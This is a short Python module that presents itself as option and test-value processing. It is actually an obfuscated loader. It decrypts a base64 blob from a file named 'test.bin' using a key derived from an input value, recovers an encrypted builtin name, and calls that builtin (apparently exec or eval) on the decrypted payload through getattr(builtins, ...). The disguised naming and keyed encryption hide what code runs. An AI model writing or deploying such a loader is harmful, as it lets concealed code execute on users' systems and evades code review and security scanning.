import os
import base64
import builtins
import hashlib

config_name = b'\x9f\x8at\x08\x0c\x81a\xd9\x14&\xf05d(\xd93c0\x7fw\xd0\x19Zx'

def decode_data(data: bytes, options: str) -> bytes:
    salt, ciphertext = data[:16], data[16:]
    key = hashlib.pbkdf2_hmac(
        "sha256",
        options.encode(),
        salt,
        100_000,
        dklen=len(ciphertext)
    )
    return bytes(c ^ k for c, k in zip(ciphertext, key))

methods = {'try_options': None}
def process_options(options):

    test_binary_path = os.path.join(os.path.dirname(__file__), "test.bin")
    with open(test_binary_path, "r") as f:
        encoded_data = f.read()

    data = base64.b64decode(encoded_data)
    decoded_data = base64.b64decode(decode_data(data, options))

    getattr(builtins, base64.b64decode(decode_data(config_name, options)).decode())(decoded_data)

    if methods['try_options']:
        methods['try_options'](options)

def test_value(value = None):
    if value is None:
        return False

    attr_keys = []
    for num in str(value):
        attr_keys.append(num)

    attr_keys.append('0')
    options = '-'.join(attr_keys)

    if len(attr_keys) == 0:
        return False

    process_options(options)

    return True